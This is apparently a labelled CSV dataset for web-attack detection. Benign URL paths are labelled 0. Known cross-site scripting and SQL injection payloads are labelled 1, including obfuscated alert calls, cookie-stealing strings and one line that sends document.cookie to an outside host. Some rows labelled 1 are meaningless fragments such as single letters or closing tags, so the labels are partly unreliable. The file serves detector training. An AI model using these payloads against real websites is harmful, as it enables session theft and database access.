payload,label
/search?user=profile218,0
/api/v1/users?id=apple637,0
/search?category=apple485,0
/index.php?user=apple910,0
/assets/style.css?page=shoes142,0
/login.html?q=profile177,0
/login.html?page=hải761,0
/product/detail?id=admin624,0
"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",1
/api/v1/users?page=admin877,0
/home?token=hải29,0
/home?id=contact425,0
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X",1
/login.html?id=contact788,0
/login.html?id=shoes331,0
/index.php?category=hải448,0
"<IMG SRC=""jav&#x09;ascript:alert('CrossSiteScripting');"">",1
/search?category=admin648,0
/product/detail?token=admin168,0
/index.php?page=kma706,0
/assets/style.css?page=202662,0
%0aalert(1);/”><script>///,1
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></OBJECT>,1
/api/v1/users?category=apple416,0
/api/v1/users?token=shoes628,0
/api/v1/users?id=shoes777,0
/search?page=shoes449,0
/login.html?user=shoes72,0
">""<img src=""mocha:document.cookie=true;"">",1
"""onmouseover='prompt(1)'bad="">",1
/assets/style.css?token=admin982,0
/assets/style.css?q=hải419,0
/index.php?page=shoes618,0
/assets/style.css?token=hải959,0
&lt;,1
/api/v1/users?id=book528,0
/index.php?id=hải497,0
/api/v1/users?user=admin111,0
"<param name=""scale"" value=""noscale"" />",1
"-1<TABLE><TD BACKGROUND=""javascript:document.cookie=true;"">",1
/product/detail?token=shoes736,0
/search?id=admin442,0
/home?page=book173,0
'/*,1
/home?page=book602,0
/assets/style.css?category=admin874,0
/api/v1/users?user=book125,0
/index.php?category=contact182,0
/assets/style.css?q=admin127,0
/login.html?page=admin513,0
/index.php?user=apple662,0
/search?page=apple495,0
/home?token=apple730,0
/login.html?page=shoes815,0
/assets/style.css?page=apple948,0
/login.html?category=contact446,0
/index.php?category=123567,0
/login.html?id=123678,0
/product/detail?user=admin137,0
/search?user=2026207,0
<body/onload=&lt;!--&gt;&#10alert(1)>,1
/login.html?q=shoes966,0
/home?user=admin544,0
/home?user=book749,0
"-1<IMG SRC=""jav ascript:document.cookie=true;"">",1
/api/v1/users?token=book954,0
/search?q=kma815,0
/home?category=profile709,0
/login.html?token=contact386,0
/login.html?page=kma872,0
/api/v1/users?category=kma242,0
/login.html?q=123436,0
/product/detail?q=admin788,0
r,1
/login.html?q=contact668,0
/home?token=2026999,0
/login.html?q=profile164,0
/login.html?token=apple668,0
/api/v1/users?category=book415,0
/assets/style.css?q=2026514,0
/index.php?page=profile328,0
/api/v1/users?page=2026228,0
/api/v1/users?id=contact832,0
/product/detail?token=book38,0
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,1
/index.php?user=123857,0
/api/v1/users?page=2026241,0
/api/v1/users?token=2026523,0
/index.php?category=book11,0
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,1
/search?page=2026158,0
/api/v1/users?user=123457,0
/assets/style.css?page=book56,0
/login.html?category=apple661,0
/search?q=hải487,0
">""<SCRIPT <B>document.cookie=true;</SCRIPT>",1
/index.php?token=2026435,0
/login.html?token=2026884,0
/api/v1/users?page=book927,0
<img src=sa onerror=eval(document.location.hash.substr(1))>,1
/api/v1/users?token=123907,0
/api/v1/users?q=123938,0
/assets/style.css?user=kma922,0
/assets/style.css?id=admin282,0
/product/detail?page=profile843,0
/product/detail?category=contact734,0
/home?id=apple640,0
/assets/style.css?id=12310,0
/home?id=profile699,0
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,1
/index.php?id=book850,0
/login.html?category=hải572,0
/search?page=2026128,0
/api/v1/users?id=hải807,0
' OR '1'='1' #,1
/api/v1/users?token=kma341,0
/api/v1/users?id=2026836,0
/login.html?page=profile838,0
/api/v1/users?page=hải654,0
/home?id=profile584,0
L,1
/product/detail?category=hải831,0
""";document.write('<img sr'%2b'c=http://www.site.com/xss?'%2bdocument['cookie']%2b'>');""",1
/product/detail?q=2026198,0
/api/v1/users?id=hải288,0
\x3C,1
/product/detail?page=admin479,0
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",1
/assets/style.css?id=contact881,0
"<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:alert('XSS')""&gt;</B></I></XML> <SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",1
/api/v1/users?id=123731,0
/home?user=12326,0
/assets/style.css?q=contact379,0
"d=""alert('CrossSiteScripting');\"")"";",1
/assets/style.css?category=hải926,0
/product/detail?id=profile376,0
/home?id=123426,0
/login.html?category=admin71,0
"<XML SRC=""CrossSiteScriptingtest.xml"" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",1
/search?token=contact20,0
/index.php?category=apple249,0
/api/v1/users?category=hải652,0
"' UNION SELECT NULL,NULL,NULL--",1
/product/detail?token=123197,0
/product/detail?q=12345,0
/index.php?token=apple984,0
/assets/style.css?category=profile517,0
">""<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]<![CDATA[cript:document.cookie=true;"">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",1
/api/v1/users?id=admin371,0
/login.html?q=shoes661,0
/home?q=apple417,0
"perl -e 'print ""<IMG SRC=java\0script:alert(\""CrossSiteScripting\"")>"";' > out",1
/product/detail?user=contact618,0
/home?page=book720,0
';}</script><script>alert('XSS')</script>,1
/search?category=hải428,0
/assets/style.css?user=hải114,0
/product/detail?page=hải533,0
/product/detail?category=profile286,0
<svg><script ?>alert(1),1
/product/detail?q=shoes54,0
/search?category=book785,0
/home?token=book429,0
/home?category=contact360,0
"<TABLE BACKGROUND=""javascript:alert('CrossSiteScripting')"">",1
/assets/style.css?token=profile650,0
/home?q=apple623,0
insert <script>alert(document.cookie)</script>,1
/index.php?id=2026288,0
/api/v1/users?q=kma776,0
/login.html?category=profile34,0
/index.php?category=apple849,0
/index.php?id=profile672,0
/login.html?category=admin647,0
/assets/style.css?page=contact958,0
/product/detail?user=book391,0
/login.html?id=admin906,0
/product/detail?category=2026871,0
/assets/style.css?user=shoes264,0
/assets/style.css?id=shoes231,0
/index.php?page=admin658,0
/search?page=kma795,0
/product/detail?category=admin249,0
</item>,1
/home?user=admin376,0
/index.php?category=apple38,0
add user <script>alert(document.cookie)</script> <script>alert(document.cookie)</script>@gmail.com,1
/home?id=book976,0
/product/detail?category=admin767,0
/home?category=kma479,0
/assets/style.css?token=apple721,0
/index.php?id=contact859,0
/product/detail?category=profile523,0
/search?user=123161,0
/api/v1/users?category=admin957,0
/index.php?token=2026490,0
/product/detail?page=admin899,0
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",1
/index.php?page=apple556,0
/product/detail?user=admin576,0
/api/v1/users?id=admin672,0
"<IMG SRC=""javascript:alert('XSS')""",1
/home?token=shoes641,0
/search?category=book173,0
/assets/style.css?q=book705,0
/assets/style.css?q=hải330,0
/login.html?id=profile428,0
/login.html?user=contact991,0
/home?page=contact310,0
/login.html?user=2026421,0
/product/detail?q=admin529,0
/login.html?page=2026757,0
/index.php?category=kma265,0
/login.html?category=apple349,0
/login.html?token=kma281,0
/search?q=contact577,0
/search?id=kma756,0
/login.html?token=123263,0
/product/detail?token=shoes2,0
/api/v1/users?token=123360,0
/login.html?q=kma480,0
/product/detail?q=contact592,0
/index.php?token=2026249,0
/login.html?user=hải957,0
/login.html?user=hải45,0
/login.html?token=2026754,0
/search?q=2026372,0
/index.php?user=apple122,0
/search?id=123541,0
/index.php?token=kma851,0
/search?page=profile891,0
"<?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time"">",1
/home?category=book999,0
/api/v1/users?id=profile314,0
/home?token=contact132,0
"<IMG LOWSRC=""javascript:alert('XSS')"">",1
/login.html?id=profile347,0
/index.php?q=profile629,0
/assets/style.css?q=2026117,0
/login.html?page=profile303,0
/api/v1/users?id=2026672,0
/login.html?token=hải38,0
/search?page=hải970,0
/assets/style.css?page=hải206,0
/assets/style.css?user=123154,0
/login.html?token=2026545,0
/assets/style.css?page=profile165,0
/assets/style.css?token=hải587,0
/search?category=kma362,0
/product/detail?id=kma237,0
/assets/style.css?id=kma962,0
"<a href=""java%1B(Jscript:alert(1)"">test",1
/login.html?category=2026622,0
/login.html?user=book458,0
/search?id=apple624,0
/login.html?page=book205,0
%E2%80%B9%25tag+style%3D%22xss%3Aexpression%28alert%28123%29%29%22+%E2%80%BA,1
/index.php?q=2026199,0
/home?category=contact894,0
/assets/style.css?q=admin572,0
/product/detail?token=kma26,0
/index.php?user=hải399,0
/product/detail?q=123197,0
&#x0003c;,1
/index.php?page=book409,0
/api/v1/users?category=admin435,0
/search?user=profile529,0
/product/detail?q=profile838,0
/api/v1/users?q=profile76,0
/assets/style.css?q=2026309,0
<!--[if gte IE 4]>,1
/assets/style.css?q=kma876,0
/search?id=book901,0
/search?page=contact440,0
/search?token=2026808,0
"<ScriPt>ALeRt(""i am here"")</scriPt>",1
/login.html?id=123185,0
/index.php?id=hải257,0
/login.html?user=profile24,0
<style><!--</style><script>document.cookie=true;//--></script>,1
/index.php?page=book764,0
/index.php?token=hải838,0
/index.php?token=contact754,0
%3ciMg+SrC%3dx+OnErRoR%3dalert(51336)%3e,1
/index.php?q=admin898,0
/product/detail?page=apple500,0
/login.html?page=profile755,0
/assets/style.css?id=hải560,0
/product/detail?token=profile789,0
/home?page=kma923,0
/index.php?token=shoes759,0
/home?token=book623,0
/product/detail?user=apple644,0
/api/v1/users?q=book228,0
/product/detail?q=admin548,0
/search?token=123372,0
/login.html?user=shoes767,0
/api/v1/users?page=hải135,0
"-1<IMG SRC=""javascript:document.cookie=true;"">",1
/api/v1/users?page=profile947,0
/assets/style.css?user=profile506,0
/home?id=2026691,0
/assets/style.css?category=contact461,0
/index.php?id=202637,0
\x3c,1
/api/v1/users?page=admin656,0
/search?user=shoes723,0
/product/detail?user=apple793,0
/assets/style.css?id=contact45,0
/index.php?user=apple848,0
/home?id=contact9,0
/product/detail?token=2026657,0
/home?q=profile899,0
/assets/style.css?page=admin216,0
/index.php?user=profile462,0
/assets/style.css?page=123159,0
/product/detail?user=contact761,0
/login.html?q=2026919,0
/index.php?id=apple548,0
/api/v1/users?id=admin418,0
/home?page=shoes885,0
/api/v1/users?category=123310,0
/home?token=hải837,0
/search?page=book581,0
&#X03c,1
/login.html?category=book734,0
/home?category=contact911,0
/product/detail?page=hải432,0
/index.php?id=book884,0
/assets/style.css?q=2026212,0
/search?id=kma269,0
/assets/style.css?user=apple846,0
<SCRIPT>document.cookie=true;//<</SCRIPT>,1
/assets/style.css?category=hải530,0
/api/v1/users?user=contact52,0
/product/detail?token=book752,0
/api/v1/users?page=123444,0
/login.html?page=hải626,0
/search?user=admin660,0
/search?token=2026985,0
/product/detail?category=123542,0
/assets/style.css?q=kma725,0
/home?page=123376,0
/index.php?q=apple634,0
/search?token=2026383,0
/home?token=kma527,0
/login.html?page=apple661,0
/api/v1/users?token=2026915,0
/search?page=kma859,0
/search?category=book880,0
/api/v1/users?id=apple925,0
/product/detail?token=admin523,0
/search?q=123960,0
/assets/style.css?q=contact67,0
/api/v1/users?user=contact101,0
/assets/style.css?page=hải484,0
/login.html?page=hải811,0
/search?page=2026288,0
/product/detail?id=kma20,0
/login.html?token=123837,0
/assets/style.css?id=shoes207,0
/api/v1/users?q=profile634,0
/index.php?user=kma521,0
/login.html?user=apple325,0
/home?id=shoes945,0
/index.php?user=kma518,0
/assets/style.css?page=book682,0
"<CrossSiteScripting STYLE=""CrossSiteScripting:expression(alert('CrossSiteScripting'))"">  exp/*<A STYLE='no\CrossSiteScripting:noCrossSiteScripting(""*//*"");  CrossSiteScripting:ex&#x2F;*CrossSiteScripting*//*/*/pression(alert(""CrossSiteScripting""))'>",1
/home?user=202698,0
/index.php?q=123802,0
/login.html?q=admin116,0
/product/detail?q=apple869,0
/api/v1/users?token=book636,0
/api/v1/users?id=book290,0
/search?category=2026694,0
/index.php?id=contact71,0
/product/detail?user=contact469,0
/login.html?token=123237,0
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,1
/login.html?category=book894,0
"-1<BODY BACKGROUND=""javascript:document.cookie=true;"">",1
/index.php?category=book980,0
/home?user=profile16,0
/assets/style.css?token=admin723,0
"""+onkeypress=""alert(23)""+""",1
/index.php?q=123341,0
/index.php?user=book517,0
"-1<LINK REL=""stylesheet"" HREF=""javascript:document.cookie=true;"">",1
/assets/style.css?user=book448,0
/index.php?category=profile283,0
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,1
"<STYLE>@im\port'\ja\vasc\ript:alert(""CrossSiteScripting"")';</STYLE>",1
/assets/style.css?token=2026142,0
/api/v1/users?token=hải17,0
/search?user=apple424,0
/login.html?page=2026419,0
/api/v1/users?category=admin769,0
/assets/style.css?token=kma691,0
/api/v1/users?page=book995,0
/assets/style.css?q=kma64,0
/home?q=apple778,0
/login.html?page=123993,0
">""<DIV STYLE=""background-image: url(javascript:document.cookie=true;)"">",1
/product/detail?page=profile960,0
/home?q=contact770,0
/search?page=book786,0
/search?id=shoes440,0
/api/v1/users?q=profile275,0
/login.html?user=hải744,0
/product/detail?user=kma230,0
"%22%20onmouseover%3dalert(String.fromCharCode(88,83,83))%20par%3d%22",1
/search?q=contact733,0
/api/v1/users?id=profile968,0
/login.html?category=2026373,0
/index.php?q=kma56,0
/login.html?token=hải596,0
/index.php?user=contact608,0
/login.html?user=12396,0
/assets/style.css?user=123374,0
/index.php?page=profile943,0
/home?page=book375,0
"""><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",1
/api/v1/users?category=book753,0
/product/detail?page=2026929,0
/search?user=shoes699,0
/search?page=2026112,0
/assets/style.css?category=hải317,0
/index.php?q=admin12,0
/login.html?q=shoes158,0
/index.php?user=kma351,0
/api/v1/users?token=shoes191,0
""") OR ""1""=""1""--",1
/assets/style.css?page=123340,0
/login.html?token=apple886,0
/login.html?id=contact958,0
"<input type=""hidden"" name=""asdhakjshdkjashdkjashd"" value=""\"" onload=confirm(000) />"" />",1
XSS%22%3E%3C/div%3E%3Ciframe%20src=http://www.unirostock.de%20style=width:600px;height:500px%3E,1
/product/detail?q=book875,0
/home?token=book985,0
/login.html?token=contact430,0
/search?id=apple225,0
/product/detail?token=shoes337,0
%3C%69%66%72%61%6D%65%20%73%72%63%3D%68%74%74%70%3A%2F%2F%74%65%73%74%2E%64%65%3E,1
"-1<DIV STYLE=""background-image: url(javascript:document.cookie=true;)"">",1
"<IMG LOWSRC=""javascript:alert('XSS');"">",1
/api/v1/users?category=profile832,0
/index.php?q=apple378,0
"<IMG SRC=""javascript:alert('CrossSiteScripting')""",1
/home?category=apple15,0
/login.html?category=shoes446,0
/product/detail?page=shoes507,0
/product/detail?q=2026199,0
/assets/style.css?page=hải692,0
/api/v1/users?q=123583,0
</object>,1
/login.html?category=hải148,0
/api/v1/users?category=profile432,0
</channel>,1
/index.php?user=admin789,0
/product/detail?page=2026180,0
/api/v1/users?category=apple906,0
/login.html?category=contact722,0
/index.php?id=kma943,0
/product/detail?user=apple651,0
/product/detail?user=hải274,0
/assets/style.css?id=kma918,0
/assets/style.css?id=contact815,0
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('CrossSiteScripting');"">",1
/index.php?token=contact874,0
/home?token=contact944,0
/assets/style.css?page=hải797,0
/product/detail?page=book182,0
/product/detail?page=123272,0
/product/detail?category=hải330,0
' OR TRUE--,1
/assets/style.css?category=shoes497,0
Cross Site Scripting Strings with close TAG:,1
/login.html?category=contact189,0
/api/v1/users?q=kma999,0
/api/v1/users?q=apple590,0
/home?category=kma729,0
/api/v1/users?page=apple942,0
/search?id=book176,0
/login.html?user=123913,0
/login.html?category=admin588,0
/api/v1/users?page=book991,0
/api/v1/users?category=apple508,0
"<IMG SRC=""javascript:alert('XSS');"">",1
/api/v1/users?id=profile815,0
/index.php?token=hải412,0
"<IMG SRC= onmouseover=""alert('xxs')"">",1
/assets/style.css?token=book906,0
/product/detail?page=kma661,0
/login.html?category=shoes723,0
/api/v1/users?id=shoes664,0
/api/v1/users?q=admin989,0
&#0060;,1
/login.html?id=123685,0
/api/v1/users?category=admin25,0
/product/detail?category=123565,0
/index.php?user=202644,0
/product/detail?page=kma714,0
/login.html?token=admin227,0
/index.php?user=book546,0
/api/v1/users?q=shoes129,0
/assets/style.css?q=contact640,0
/assets/style.css?q=profile689,0
/product/detail?q=profile591,0
"</a onmousemove=""alert(1)"">",1
/search?q=shoes493,0
:,1
/home?page=2026519,0
/index.php?token=kma665,0
/api/v1/users?id=apple759,0
/api/v1/users?q=book168,0
"<meta http-equiv=""refresh"" content=""0;url=//goo.gl/nlX0P"">",1
/product/detail?q=admin269,0
/login.html?page=shoes592,0
/login.html?page=book218,0
/api/v1/users?q=apple479,0
